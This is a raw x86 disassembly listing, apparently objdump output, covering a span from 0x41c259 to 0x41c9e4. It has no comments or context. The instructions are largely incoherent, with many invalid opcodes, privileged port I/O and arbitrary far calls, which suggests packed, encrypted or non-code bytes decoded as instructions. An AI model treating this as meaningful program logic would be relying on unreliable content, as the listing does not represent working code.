  41c259:	jmp    0xefba:0x5c51d88b
  41c260:	fst    st(0)
  41c263:	mov    esp,0x4f396ef2
  41c268:	test   cl,bl
  41c26a:	frstor [ebp+0x4b5f8d94]
  41c270:	dec    edi
  41c271:	daa    
  41c272:	es mov bh,0xee
  41c275:	cmp    DWORD PTR [ebx],ecx
  41c277:	cdq    
  41c278:	(bad)  
  41c279:	xchg   ecx,eax
  41c27a:	cwde   
  41c27b:	fistp  QWORD PTR [eax+0x70e9e1e9]
  41c281:	clc    
  41c282:	mov    BYTE PTR [esi-0x41],al
  41c285:	mov    ecx,0x1ac1c22a
  41c28a:	push   esp
  41c28b:	(bad)  
  41c28c:	pop    edx
  41c28d:	jo     0x41c285
  41c28f:	(bad)  
  41c290:	mov    ecx,0x90bcad66
  41c295:	mov    edi,0x4c6c75a5
  41c29a:	xor    ebp,DWORD PTR [edx+ebp*4+0x5d4173a]
  41c2a1:	adc    al,0x5c
  41c2a3:	cmc    
  41c2a4:	jnp    0x41c2d4
  41c2a6:	cs mov dl,0x6
  41c2a9:	jnp    0x41c2b3
  41c2ab:	mov    ds:0x5c8501d7,eax
  41c2b0:	scas   eax,DWORD PTR es:[edi]
  41c2b1:	outs   dx,BYTE PTR ds:[esi]
  41c2b2:	addr16 inc edx
  41c2b4:	(bad)  
  41c2b5:	call   0x16c4162d
  41c2ba:	mov    bh,0xc6
  41c2bc:	ret    
  41c2bd:	cmp    BYTE PTR [ebx+0x2d],0x5d
  41c2c1:	mov    ds:0x3d785d5,eax
  41c2c6:	not    DWORD PTR [edx-0x3cc344fc]
  41c2cc:	data16 fdiv QWORD PTR [esi-0x70014370]
  41c2d3:	popf   
  41c2d4:	pop    ebp
  41c2d5:	shl    dh,1
  41c2d7:	and    DWORD PTR [edx-0x4253c554],edx
  41c2dd:	lock stos DWORD PTR es:[edi],eax
  41c2df:	xchg   BYTE PTR [edx],dl
  41c2e1:	dec    esp
  41c2e2:	scas   al,BYTE PTR es:[edi]
  41c2e3:	pop    eax
  41c2e4:	fs push 0x37e5c125
  41c2ea:	sbb    edx,DWORD PTR [ebx+0x1b80dc75]
  41c2f0:	mov    cl,0x8c
  41c2f2:	call   0xe3d9:0x2320d8a
  41c2f9:	ror    DWORD PTR [edx+edx*4],0x43
  41c2fd:	or     eax,0xde468bab
  41c302:	add    cl,BYTE PTR [esi]
  41c304:	jnp    0x41c363
  41c306:	xchg   ebx,eax
  41c307:	jbe    0x41c2de
  41c309:	sbb    dh,BYTE PTR [eax]
  41c30b:	std    
  41c30c:	out    0x80,eax
  41c30e:	jbe    0x41c376
  41c310:	nop
  41c311:	push   edi
  41c312:	sub    al,0x42
  41c314:	lock (bad) 
  41c316:	xchg   esp,eax
  41c317:	xchg   ebp,eax
  41c318:	push   0x1e0855ea
  41c31d:	xchg   cl,dh
  41c31f:	das    
  41c320:	jbe    0x41c2f3
  41c322:	enter  0x5568,0xc9
  41c326:	(bad)  
  41c327:	sbb    edx,ecx
  41c329:	retf   0x1aed
  41c32c:	loop   0x41c343
  41c32e:	pop    ebp
  41c32f:	or     DWORD PTR [ebp-0xe2d8fd4],ebp
  41c335:	mov    ecx,0x903b1c44
  41c33a:	cli    
  41c33b:	add    cl,BYTE PTR ds:0xd22b52b4
  41c341:	in     eax,0xc6
  41c343:	push   edx
  41c344:	jae    0x41c2e8
  41c346:	push   edi
  41c347:	add    BYTE PTR [ecx],cl
  41c349:	and    DWORD PTR [ebx+0x79],0x6c
  41c34d:	add    ecx,ebp
  41c34f:	lahf   
  41c350:	sub    al,0x67
  41c352:	icebp  
  41c353:	mov    al,0xea
  41c355:	adc    ah,ah
  41c357:	repz into 
  41c359:	retf   0x4b12
  41c35c:	aaa    
  41c35d:	cmp    al,0x43
  41c35f:	cmp    cl,dh
  41c361:	xchg   esp,eax
  41c362:	mov    cl,0x71
  41c364:	int    0x8e
  41c366:	aam    0x66
  41c368:	pop    ss
  41c369:	das    
  41c36a:	mov    edx,0xf2f436ff
  41c370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c371:	stos   DWORD PTR es:[edi],eax
  41c372:	call   0x4712:0x230b11a4
  41c379:	int    0x66
  41c37b:	xor    DWORD PTR [ecx+0x71c844c],eax
  41c381:	adc    al,dh
  41c383:	ds mov edi,0xc19faf03
  41c389:	push   edx
  41c38a:	inc    edi
  41c38b:	jbe    0x41c327
  41c38d:	dec    esp
  41c38e:	and    ecx,DWORD PTR [edx-0x20e60f0]
  41c394:	push   edi
  41c395:	cmp    dl,BYTE PTR [ebx-0x685d94ff]
  41c39b:	xchg   BYTE PTR [edx-0x39],bl
  41c39e:	xlat   BYTE PTR ds:[ebx]
  41c39f:	mov    ds:0x9a7d1fe0,eax
  41c3a4:	cmp    esi,DWORD PTR [edi+ebx*2-0x2d6be949]
  41c3ab:	adc    edi,DWORD PTR [edx+0x8]
  41c3ae:	dec    BYTE PTR [ebx-0x1222ec59]
  41c3b4:	and    ebx,DWORD PTR [edi]
  41c3b6:	fsub   st,st(2)
  41c3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3b9:	cli    
  41c3ba:	fcmovbe st,st(5)
  41c3bc:	(bad)  
  41c3bd:	sub    BYTE PTR [eax-0x5beca8fe],cl
  41c3c3:	inc    ebp
  41c3c4:	mov    edx,DWORD PTR [ebx]
  41c3c6:	sahf   
  41c3c7:	clc    
  41c3c8:	xor    BYTE PTR [edi+0x73],al
  41c3cb:	pop    esi
  41c3cc:	sbb    BYTE PTR [ecx-0x75a8f405],0xf9
  41c3d3:	jle    0x41c402
  41c3d5:	call   0x686a1684
  41c3da:	push   0x3a
  41c3dc:	iret   
  41c3dd:	xor    al,0x4d
  41c3df:	jns    0x41c3ab
  41c3e1:	mov    ds:0xeef9ea6f,eax
  41c3e6:	in     eax,0xd3
  41c3e8:	dec    esi
  41c3e9:	imul   esp,esi,0x439c32c3
  41c3ef:	pusha  
  41c3f0:	add    eax,0x39ec5849
  41c3f5:	test   BYTE PTR [ebx-0x24],ah
  41c3f8:	xor    al,BYTE PTR [edx+0xf]
  41c3fb:	in     eax,dx
  41c3fc:	mov    DWORD PTR [esi+0x7317fc92],0xcd4402e2
  41c406:	out    dx,al
  41c407:	inc    eax
  41c408:	aam    0xc1
  41c40a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c40b:	in     al,dx
  41c40c:	popf   
  41c40d:	sub    eax,0xcb5b835c
  41c412:	test   BYTE PTR [ebx+0x43],dh
  41c415:	xlat   BYTE PTR ds:[ebx]
  41c416:	xchg   DWORD PTR [ebx-0x6919be1b],esp
  41c41c:	dec    esi
  41c41d:	xchg   BYTE PTR [ecx-0x47],dh
  41c420:	aaa    
  41c421:	sbb    eax,0x29e125b3
  41c426:	pop    esp
  41c427:	xor    eax,0x9955cac8
  41c42c:	mov    bh,0x0
  41c42e:	inc    edi
  41c42f:	adc    bl,bl
  41c431:	cmp    al,0x1e
  41c433:	enter  0x17a7,0x91
  41c437:	pop    ebx
  41c438:	mov    edi,DWORD PTR [ebx]
  41c43a:	shr    DWORD PTR [ebx+0x31d066a0],cl
  41c440:	cmc    
  41c441:	popf   
  41c442:	dec    ecx
  41c443:	sbb    BYTE PTR [eax+0x3b8c1ae],cl
  41c449:	sbb    al,0x53
  41c44b:	ja     0x41c47f
  41c44d:	xor    ebp,DWORD PTR [edi]
  41c44f:	jmp    0x41c4ac
  41c451:	stos   BYTE PTR es:[edi],al
  41c452:	xchg   esp,eax
  41c453:	jp     0x41c492
  41c455:	cmp    edi,ebx
  41c457:	lods   al,BYTE PTR ds:[esi]
  41c458:	out    dx,al
  41c459:	mov    dh,0x3c
  41c45b:	dec    ebx
  41c45c:	fld    QWORD PTR [eax+0x37053fb7]
  41c462:	scas   eax,DWORD PTR es:[di]
  41c464:	shr    BYTE PTR [edx],cl
  41c466:	int3   
  41c467:	mov    ecx,0x11a70fa9
  41c46c:	pushf  
  41c46d:	mov    WORD PTR [edi],ss
  41c46f:	ins    DWORD PTR es:[edi],dx
  41c470:	push   ebp
  41c471:	lahf   
  41c472:	cmp    BYTE PTR [ebp-0x50],bl
  41c475:	push   esp
  41c476:	mov    esp,?
  41c478:	mov    ds:0x1e12774b,eax
  41c47d:	into   
  41c47e:	fwait
  41c47f:	bswap  ebx
  41c481:	mov    al,ds:0xf57f636f
  41c486:	mov    edx,0xbd9c69a6
  41c48b:	xor    bl,ch
  41c48d:	mov    ebx,0x1b7f94a0
  41c492:	xchg   dh,bh
  41c494:	mov    ds:0x97c590a3,eax
  41c499:	sub    BYTE PTR [edx],dl
  41c49b:	adc    al,0xda
  41c49d:	popa   
  41c49e:	imul   eax,DWORD PTR [edi-0x57],0x3ed0ac57
  41c4a5:	shl    DWORD PTR [edx-0x28ae4b],1
  41c4ab:	mov    al,gs:0x5078db28
  41c4b1:	pusha  
  41c4b2:	aaa    
  41c4b3:	push   ecx
  41c4b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4b5:	std    
  41c4b6:	mov    eax,0xd90eea56
  41c4bb:	sub    BYTE PTR [ebx+0x25],0x78
  41c4bf:	mov    esp,0x7ac5b7c8
  41c4c4:	(bad)  
  41c4c5:	mov    edi,0xed7ad26f
  41c4ca:	out    dx,al
  41c4cb:	ds inc esi
  41c4cd:	and    al,0x3d
  41c4cf:	xchg   al,cl
  41c4d1:	test   BYTE PTR [ebp+0x1a0aa708],ah
  41c4d7:	ins    DWORD PTR es:[edi],dx
  41c4d8:	(bad)  [ebx-0x596dcced]
  41c4de:	fidiv  WORD PTR ds:0xbdb35c24
  41c4e4:	(bad)  
  41c4e5:	xchg   esi,eax
  41c4e6:	pop    ebp
  41c4e7:	aad    0x1a
  41c4e9:	(bad)  
  41c4ea:	retf   
  41c4eb:	sub    DWORD PTR ds:0x3f962ee5,ecx
  41c4f1:	mov    al,0xdf
  41c4f3:	fld    QWORD PTR [ecx-0x57]
  41c4f6:	test   al,0x39
  41c4f8:	xchg   edi,eax
  41c4f9:	icebp  
  41c4fa:	mov    edi,0x7e7561c0
  41c4ff:	mov    ebp,DWORD PTR [edi+0x518996dc]
  41c505:	inc    edx
  41c506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c507:	push   edi
  41c508:	mov    edi,0xf9aab7a1
  41c50d:	popa   
  41c50e:	dec    DWORD PTR [ecx+0x467aee1f]
  41c514:	dec    ebx
  41c515:	mov    cl,0x25
  41c517:	addr16 inc ebx
  41c519:	mov    ebx,0xa9a1db6b
  41c51e:	int3   
  41c51f:	mov    WORD PTR [ebx],ss
  41c521:	adc    BYTE PTR [edi],bl
  41c523:	jg     0x41c4b9
  41c525:	repz je 0x41c4ae
  41c528:	dec    ebx
  41c529:	das    
  41c52a:	popa   
  41c52b:	dec    edx
  41c52c:	and    DWORD PTR [edx-0x194c1eb],ebp
  41c532:	mov    al,ds:0x6a91526f
  41c537:	(bad)  
  41c538:	and    dh,bh
  41c53a:	lods   al,BYTE PTR ds:[esi]
  41c53b:	pop    esi
  41c53c:	inc    edx
  41c53d:	test   BYTE PTR [ecx-0x3db14e52],dl
  41c543:	bound  ebp,QWORD PTR [edi+0x1cfa8b5e]
  41c549:	loopne 0x41c4fc
  41c54b:	cmp    al,0x1c
  41c54d:	adc    al,0x40
  41c54f:	pushf  
  41c550:	push   0xffffffc9
  41c552:	clc    
  41c553:	cmp    eax,0x67480dc7
  41c558:	sub    BYTE PTR [ecx+0x6099289e],bh
  41c55e:	shr    BYTE PTR [ecx-0x28],1
  41c561:	sbb    bl,cl
  41c563:	and    al,0x7d
  41c565:	mov    fs,WORD PTR [edi+0x7b0c99b7]
  41c56b:	bound  esi,QWORD PTR [esi-0x2639a99c]
  41c571:	out    dx,al
  41c572:	sub    al,0x1e
  41c574:	add    eax,0x60edda5c
  41c579:	in     eax,0x8d
  41c57b:	and    bh,dh
  41c57d:	push   es
  41c57e:	(bad)
  41c582:	stos   DWORD PTR es:[edi],eax
  41c583:	inc    eax
  41c584:	adc    BYTE PTR [eax],ah
  41c586:	aad    0xd0
  41c588:	cmp    BYTE PTR [ebx+ebp*2-0x622093b3],al
  41c58f:	sub    eax,0xb9c2eb8b
  41c594:	xchg   edi,eax
  41c595:	sub    eax,0xed09238
  41c59a:	or     dh,0x8e
  41c59d:	daa    
  41c59e:	xchg   esp,eax
  41c59f:	mov    edx,0x36c483d8
  41c5a4:	repz call 0x8cb64c4e
  41c5aa:	adc    ah,ch
  41c5ac:	lahf   
  41c5ad:	outs   dx,BYTE PTR ds:[esi]
  41c5ae:	sub    DWORD PTR [esi],esp
  41c5b0:	lods   al,BYTE PTR ds:[esi]
  41c5b1:	call   0x1112:0x6a538adc
  41c5b8:	sub    edx,DWORD PTR ds:0x499d44b0
  41c5be:	icebp  
  41c5bf:	and    al,0xd5
  41c5c1:	xor    al,0x16
  41c5c3:	sub    DWORD PTR [ebx+0x45],esi
  41c5c6:	sub    al,0x7a
  41c5c8:	int3   
  41c5c9:	test   BYTE PTR [esi],cl
  41c5cb:	pop    ecx
  41c5cc:	dec    BYTE PTR [edi]
  41c5ce:	or     eax,0xabafa380
  41c5d3:	inc    edx
  41c5d4:	jp     0x41c573
  41c5d6:	cmp    BYTE PTR ds:0xacdb020,cl
  41c5dc:	inc    esp
  41c5dd:	push   0x5ae06d48
  41c5e2:	mov    edi,0xd118c4b5
  41c5e7:	xlat   BYTE PTR ds:[ebx]
  41c5e8:	ins    BYTE PTR es:[edi],dx
  41c5e9:	fisttp QWORD PTR [ebp-0x737ab99b]
  41c5ef:	rol    BYTE PTR [ebx+0x15],cl
  41c5f2:	dec    eax
  41c5f3:	sub    cl,BYTE PTR [esi]
  41c5f5:	mov    ch,0x9d
  41c5f7:	gs idiv ecx
  41c5fa:	imul   esp,DWORD PTR [edi-0x6d],0xffffffcd
  41c5fe:	push   ebp
  41c5ff:	inc    eax
  41c600:	lgs    edi,FWORD PTR [edi-0x4c4acece]
  41c607:	pop    es
  41c608:	add    al,0xb7
  41c60a:	pop    esp
  41c60b:	lock pop DWORD PTR [ebp-0x55]
  41c60f:	imul   ebp,DWORD PTR [ebp+ecx*1-0x22],0x7395aa19
  41c617:	xlat   BYTE PTR ds:[ebx]
  41c618:	sub    BYTE PTR [ebx-0x7b],bh
  41c61b:	jg     0x41c69b
  41c61d:	(bad)  
  41c61e:	idiv   BYTE PTR [ebx+0x41592d76]
  41c624:	xor    cl,al
  41c626:	leave  
  41c627:	lahf   
  41c628:	lahf   
  41c629:	arpl   WORD PTR [ebx+eax*4],si
  41c62c:	mov    dl,0xf2
  41c62e:	sbb    BYTE PTR [eax],dl
  41c630:	ds inc esi
  41c632:	pop    ss
  41c633:	jl     0x41c5ff
  41c635:	xlat   BYTE PTR ds:[ebx]
  41c636:	jnp    0x41c611
  41c638:	jns    0x41c649
  41c63a:	mov    ds:0x38ea8072,eax
  41c63f:	fnstcw WORD PTR [edx-0x59]
  41c642:	aaa    
  41c643:	aad    0x95
  41c645:	mov    ch,ch
  41c647:	push   0xb2c8b93e
  41c64c:	pushf  
  41c64d:	pop    es
  41c64e:	fincstp 
  41c650:	ins    BYTE PTR es:[edi],dx
  41c651:	lock pop ecx
  41c653:	mov    edx,0xdeca45e7
  41c658:	leave  
  41c659:	cmp    cl,BYTE PTR [ecx+0x5a]
  41c65c:	in     al,dx
  41c65d:	stc    
  41c65e:	out    dx,al
  41c65f:	adc    BYTE PTR [edi+0x7],ah
  41c662:	push   0x4326e5fd
  41c667:	dec    ecx
  41c668:	imul   DWORD PTR [eax]
  41c66a:	and    ebp,DWORD PTR ds:0xeb1f860
  41c670:	adc    DWORD PTR [eax+ebx*8+0x4641e9e4],0x5b
  41c678:	lods   al,BYTE PTR ds:[esi]
  41c679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c67a:	mov    bh,0x39
  41c67c:	inc    ebp
  41c67d:	mov    dl,BYTE PTR [edi+0xf43c75f]
  41c683:	xchg   ebp,eax
  41c684:	gs in  eax,0x8
  41c687:	mov    dh,0x95
  41c689:	inc    ebp
  41c68a:	cmp    esi,DWORD PTR [ecx+0x7e767585]
  41c690:	jp     0x41c624
  41c692:	add    BYTE PTR [ecx-0x3e],al
  41c695:	add    DWORD PTR [ebp+ebx*4-0x1b1f4070],esi
  41c69c:	jne    0x41c667
  41c69e:	(bad)  
  41c69f:	xor    esp,ebx
  41c6a1:	ins    DWORD PTR es:[edi],dx
  41c6a2:	outs   dx,BYTE PTR ds:[esi]
  41c6a3:	dec    esi
  41c6a4:	xchg   ebp,eax
  41c6a5:	sar    BYTE PTR gs:[ebp+0x7ec99156],cl
  41c6ac:	pushf  
  41c6ad:	sbb    esp,esp
  41c6af:	inc    edx
  41c6b0:	fdivr  QWORD PTR [ebp-0x66]
  41c6b3:	push   esp
  41c6b4:	pop    ebp
  41c6b5:	dec    edx
  41c6b6:	test   eax,0x163b157f
  41c6bb:	dec    edi
  41c6bc:	dec    esi
  41c6bd:	(bad)  
  41c6be:	jle    0x41c6fe
  41c6c0:	sahf   
  41c6c1:	popa   
  41c6c2:	push   es
  41c6c3:	xor    ch,al
  41c6c5:	clc    
  41c6c6:	jne    0x41c69c
  41c6c8:	jmp    0x41c694
  41c6ca:	loopne 0x41c6c2
  41c6cc:	or     DWORD PTR [edx-0x65],0xffffffb9
  41c6d0:	rcr    esp,1
  41c6d2:	cmp    al,0x8a
  41c6d4:	and    edx,esi
  41c6d6:	rol    eax,cl
  41c6d8:	lahf   
  41c6d9:	jbe    0x41c6b7
  41c6db:	das    
  41c6dc:	fcmovbe st,st(6)
  41c6de:	mov    ebx,0x1441a7ac
  41c6e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6e4:	jge    0x41c6f2
  41c6e6:	mov    ds:0x942e0ea3,eax
  41c6eb:	out    0x47,al
  41c6ed:	test   esp,edi
  41c6ef:	call   0x58f0:0x3bc22554
  41c6f6:	mov    dh,BYTE PTR [esp+eax*8+0x7cc73965]
  41c6fd:	push   ebx
  41c6fe:	stos   DWORD PTR es:[edi],eax
  41c6ff:	dec    esp
  41c700:	ins    BYTE PTR es:[edi],dx
  41c701:	mov    ds:0x943e1308,eax
  41c706:	mov    ecx,0x9bebc2d7
  41c70c:	xchg   edi,eax
  41c70d:	and    DWORD PTR [eax+0x24],edx
  41c710:	xchg   ebp,eax
  41c711:	jae    0x41c74c
  41c713:	and    eax,0x34af28ca
  41c718:	idiv   DWORD PTR [edi+ebp*2-0x25]
  41c71c:	iret   
  41c71d:	xor    eax,0xa169ba62
  41c722:	call   FWORD PTR [eax]
  41c724:	inc    ebx
  41c725:	das    
  41c726:	arpl   bx,sp
  41c728:	dec    esp
  41c729:	pop    edi
  41c72a:	or     cl,0x1b
  41c72d:	cmp    eax,0x161e60cf
  41c732:	xor    al,0xae
  41c734:	fmul   st,st(6)
  41c736:	xlat   BYTE PTR ds:[ebx]
  41c737:	in     al,dx
  41c738:	lock in eax,0x17
  41c73b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c73c:	push   ebx
  41c73d:	inc    edx
  41c73e:	stc    
  41c73f:	jmp    0x87850633
  41c744:	jp     0x41c79b
  41c746:	clc    
  41c747:	lock adc DWORD PTR [ebx+esi*1],0x73
  41c74c:	outs   dx,DWORD PTR ds:[esi]
  41c74d:	push   edx
  41c74e:	test   al,0x5e
  41c750:	in     eax,dx
  41c751:	(bad)  
  41c752:	cmp    edx,ebx
  41c754:	(bad)  
  41c756:	inc    esp
  41c757:	xor    ch,BYTE PTR [esi+esi*1+0x1357a293]
  41c75e:	sbb    bh,ah
  41c760:	xchg   ebx,eax
  41c761:	xor    al,0xed
  41c763:	mov    WORD PTR ss:[esi],fs
  41c766:	fstp   QWORD PTR [esp+eax*8-0x30]
  41c76a:	ds jae 0x41c71e
  41c76d:	(bad)  
  41c76e:	cld    
  41c76f:	js     0x41c6f8
  41c771:	push   cs
  41c772:	cdq    
  41c773:	loopne 0x41c787
  41c775:	xchg   DWORD PTR [ebx-0x31c8532d],esi
  41c77b:	ffreep st(5)
  41c77d:	cs push esi
  41c77f:	adc    al,0x4
  41c781:	fsub   st(7),st
  41c783:	lods   al,BYTE PTR ds:[esi]
  41c784:	adc    eax,0x3229b032
  41c789:	loope  0x41c789
  41c78b:	inc    esi
  41c78c:	popf   
  41c78d:	scas   al,BYTE PTR es:[edi]
  41c78e:	cmp    ebx,ebp
  41c790:	cmp    DWORD PTR [esi],0x57
  41c793:	out    dx,al
  41c794:	xchg   BYTE PTR [ebx],ah
  41c796:	or     edx,ebx
  41c798:	and    al,0x41
  41c79a:	call   0x8e406af6
  41c79f:	sbb    DWORD PTR [eax],ebp
  41c7a1:	test   DWORD PTR [eax-0x11],ebp
  41c7a4:	cli    
  41c7a5:	add    BYTE PTR [edx-0x15],0x7b
  41c7a9:	outs   dx,DWORD PTR ds:[esi]
  41c7aa:	adc    al,0x6a
  41c7ac:	or     DWORD PTR [ecx+ebx*1+0x11],esp
  41c7b0:	xor    al,0x85
  41c7b2:	lahf   
  41c7b3:	div    ch
  41c7b5:	shl    DWORD PTR fs:[esi+0x7fbfebda],cl
  41c7bc:	je     0x41c7ab
  41c7be:	lock push ds
  41c7c0:	stc    
  41c7c1:	in     eax,0xab
  41c7c3:	fimul  DWORD PTR [eax-0x749ba040]
  41c7c9:	stos   DWORD PTR es:[edi],eax
  41c7ca:	fnsave [ecx]
  41c7cc:	(bad)
  41c7d0:	pop    eax
  41c7d1:	fs ss mov dh,0x44
  41c7d5:	mov    eax,ds:0x69983aed
  41c7da:	mul    BYTE PTR [ecx]
  41c7dc:	jb     0x41c7d3
  41c7de:	out    0xef,eax
  41c7e0:	mov    dh,BYTE PTR [esi+eax*4-0x34ce760e]
  41c7e7:	je     0x41c7fa
  41c7e9:	mov    dl,0x57
  41c7eb:	loopne 0x41c770
  41c7ed:	fldenv [esi+ebp*1-0x365627c4]
  41c7f4:	pop    eax
  41c7f5:	dec    eax
  41c7f6:	pop    edx
  41c7f7:	inc    ecx
  41c7f8:	rcr    BYTE PTR cs:[ebx],1
  41c7fb:	add    dh,BYTE PTR [esp+esi*2+0x720b95ea]
  41c802:	icebp  
  41c803:	xchg   DWORD PTR [edi],ecx
  41c805:	mov    ds:0x269face3,al
  41c80a:	mov    ebx,0x19df3f76
  41c80f:	xchg   BYTE PTR [ebx-0x18],bl
  41c812:	mov    dh,0x60
  41c814:	outs   dx,BYTE PTR ds:[esi]
  41c815:	repnz pop eax
  41c817:	cmp    al,0x26
  41c819:	push   es
  41c81a:	imul   esi,DWORD PTR [esi],0xffffffd9
  41c81d:	push   es
  41c81e:	(bad)  
  41c81f:	es mov edi,0x74cb66d5
  41c825:	xchg   ecx,eax
  41c826:	enter  0x334d,0xc5
  41c82a:	cmp    al,0x5b
  41c82c:	push   edx
  41c82d:	mov    ds:0x510a288e,eax
  41c832:	pop    edx
  41c833:	adc    dl,BYTE PTR [edx+0x10]
  41c836:	dec    ebp
  41c837:	adc    eax,0x31662c31
  41c83c:	in     al,dx
  41c83d:	test   BYTE PTR ds:[esi+0x1d254183],ah
  41c844:	adc    DWORD PTR ds:0x93f64973,edx
  41c84a:	push   edi
  41c84b:	fnsave [esi+0x4ef2e661]
  41c851:	and    eax,DWORD PTR [ebx-0x485ded1c]
  41c857:	aad    0xf9
  41c859:	call   0x9825:0xc4207626
  41c860:	adc    bl,BYTE PTR [ebx-0x25]
  41c863:	ins    BYTE PTR es:[edi],dx
  41c864:	mul    BYTE PTR [ebx]
  41c866:	mov    eax,ds:0x44d6d791
  41c86b:	jb     0x41c820
  41c86d:	mov    bh,0x4a
  41c86f:	pop    esi
  41c870:	sub    DWORD PTR [edi],ecx
  41c872:	xor    ch,BYTE PTR [ecx]
  41c874:	(bad)  
  41c875:	jecxz  0x41c855
  41c877:	inc    esi
  41c878:	out    dx,eax
  41c879:	sahf   
  41c87a:	int3   
  41c87b:	inc    edi
  41c87c:	jge    0x41c8c9
  41c87e:	imul   ebx,ecx,0x19
  41c881:	jb     0x41c879
  41c883:	rcr    dh,1
  41c885:	and    DWORD PTR [edx+0x691a7ce5],edi
  41c88b:	mov    bh,0x5a
  41c88d:	lods   al,BYTE PTR ds:[esi]
  41c88e:	xchg   ecx,eax
  41c88f:	and    dh,BYTE PTR [ebx-0x7733abb4]
  41c895:	fs mov ebx,0x6316ebca
  41c89b:	xchg   edi,eax
  41c89c:	lods   al,BYTE PTR ds:[esi]
  41c89d:	sbb    eax,0x9acd988b
  41c8a2:	inc    edx
  41c8a3:	cmp    eax,0xb4c41a17
  41c8a8:	test   al,0x5b
  41c8aa:	fistp  DWORD PTR ss:[ecx]
  41c8ad:	gs add al,0x57
  41c8b0:	ja     0x41c917
  41c8b2:	or     BYTE PTR [ebp-0x33],bh
  41c8b5:	aad    0x85
  41c8b7:	mov    dh,0x70
  41c8b9:	test   al,0xc1
  41c8bb:	sub    edi,edx
  41c8bd:	or     esp,DWORD PTR [edx]
  41c8bf:	push   esi
  41c8c0:	mov    eax,ds:0x74aa0d63
  41c8c5:	lock leave 
  41c8c7:	pop    ss
  41c8c8:	ss mov dh,0x6e
  41c8cb:	jo     0x41c923
  41c8cd:	js     0x41c90e
  41c8cf:	adc    DWORD PTR [esi],esp
  41c8d1:	retf   
  41c8d2:	fdivr  DWORD PTR [eax]
  41c8d4:	mov    eax,ds:0x3767a8d8
  41c8d9:	pop    esp
  41c8da:	xchg   ebp,eax
  41c8db:	jp     0x41c8d7
  41c8dd:	popa   
  41c8de:	out    0x47,eax
  41c8e0:	icebp  
  41c8e1:	imul   ecx,DWORD PTR [ebx],0xffffffac
  41c8e4:	cmp    BYTE PTR [esi-0x70a4cd20],bh
  41c8ea:	sub    DWORD PTR [ebx-0x4b5adaa9],esi
  41c8f0:	retf   
  41c8f1:	or     ebx,DWORD PTR [ecx]
  41c8f3:	xchg   edx,eax
  41c8f4:	clc    
  41c8f5:	pusha  
  41c8f6:	cdq    
  41c8f7:	das    
  41c8f8:	inc    ebx
  41c8f9:	or     edx,DWORD PTR [eax]
  41c8fb:	inc    eax
  41c8fc:	inc    ebp
  41c8fd:	sub    eax,0x5d9a4aa2
  41c902:	jb     0x41c8f9
  41c904:	push   eax
  41c905:	leave  
  41c906:	lea    ebx,[eax]
  41c908:	mov    WORD PTR [eax-0x56],gs
  41c90b:	lea    esi,[ebp+0x6]
  41c90e:	jge    0x41c8c7
  41c910:	pusha  
  41c911:	xchg   edi,eax
  41c912:	jno    0x41c916
  41c914:	add    eax,0x21f990eb
  41c919:	outs   dx,DWORD PTR ds:[esi]
  41c91a:	dec    ebx
  41c91b:	jnp    0x41c8ec
  41c91d:	mov    eax,ds:0x486004dc
  41c922:	pop    ds
  41c923:	imul   edi,ebx,0x9
  41c926:	hlt    
  41c927:	sbb    edi,ebp
  41c929:	jmp    0x86ec:0xdb4bcb22
  41c930:	popf   
  41c931:	je     0x41c8d1
  41c933:	sar    BYTE PTR [esi],0x25
  41c936:	or     eax,0xbbf81191
  41c93b:	dec    esi
  41c93c:	sar    BYTE PTR [esi+0x6b],cl
  41c93f:	lods   al,BYTE PTR ds:[esi]
  41c940:	(bad)  
  41c941:	mov    edi,0xf510af8a
  41c946:	jnp    0x41c9b0
  41c948:	mov    ebx,0xdc564795
  41c94d:	pop    eax
  41c94e:	inc    esp
  41c94f:	aas    
  41c950:	and    dl,BYTE PTR [edi]
  41c952:	dec    esi
  41c953:	in     al,0xa0
  41c955:	sbb    eax,0x7a50472b
  41c95a:	mov    ds:0x11c44822,al
  41c95f:	mov    dl,0x8
  41c961:	lds    edx,FWORD PTR [eax-0x38]
  41c964:	popa   
  41c965:	and    al,0xf9
  41c967:	jl     0x41c8f2
  41c969:	jnp    0x41c9cf
  41c96b:	pop    ss
  41c96c:	sbb    al,0xdc
  41c96e:	sbb    al,0x1b
  41c970:	mov    eax,DWORD PTR [esi-0x55]
  41c973:	sahf   
  41c974:	lods   eax,DWORD PTR ds:[esi]
  41c975:	retf   0xe2cc
  41c978:	sbb    DWORD PTR ds:0xa9585018,0x17
  41c97f:	adc    cl,dl
  41c981:	cdq    
  41c982:	push   edx
  41c983:	and    ch,dl
  41c985:	mov    dh,0xdf
  41c987:	repz push edi
  41c989:	lahf   
  41c98a:	call   0x73f8:0x34db9d21
  41c991:	or     bh,BYTE PTR [edi-0x39]
  41c994:	xchg   esp,eax
  41c995:	ror    esp,1
  41c997:	js     0x41ca14
  41c999:	into   
  41c99a:	mov    eax,ds:0x283edd42
  41c99f:	xchg   ecx,eax
  41c9a0:	in     al,0x9f
  41c9a2:	inc    ebp
  41c9a3:	cli    
  41c9a4:	imul   eax,DWORD PTR [ecx],0xa51153dc
  41c9aa:	pop    ebp
  41c9ab:	xchg   edx,eax
  41c9ac:	jmp    0x19dc:0xcbebff7e
  41c9b3:	xlat   BYTE PTR ds:[ebx]
  41c9b4:	xor    DWORD PTR [eax+esi*1+0xb],esi
  41c9b8:	push   es
  41c9b9:	leave  
  41c9ba:	sar    DWORD PTR [edx],0xbf
  41c9bd:	aad    0x8f
  41c9bf:	mov    eax,ds:0xf2d2ad03
  41c9c4:	dec    eax
  41c9c5:	push   cs
  41c9c6:	xchg   DWORD PTR [ebp+edx*4-0x2f663516],ecx
  41c9cd:	and    BYTE PTR [esi],dl
  41c9cf:	stos   DWORD PTR es:[edi],eax
  41c9d0:	jecxz  0x41c9f1
  41c9d2:	rcl    BYTE PTR [edi],1
  41c9d4:	cmp    dh,BYTE PTR [esi+0x71]
  41c9d7:	mov    DWORD PTR [edx-0x42510fa9],esp
  41c9dd:	les    ebp,FWORD PTR [ebx+ebp*8-0x40d25cc4]
  41c9e4:	fidiv  WORD PTR [edx-0x6c]
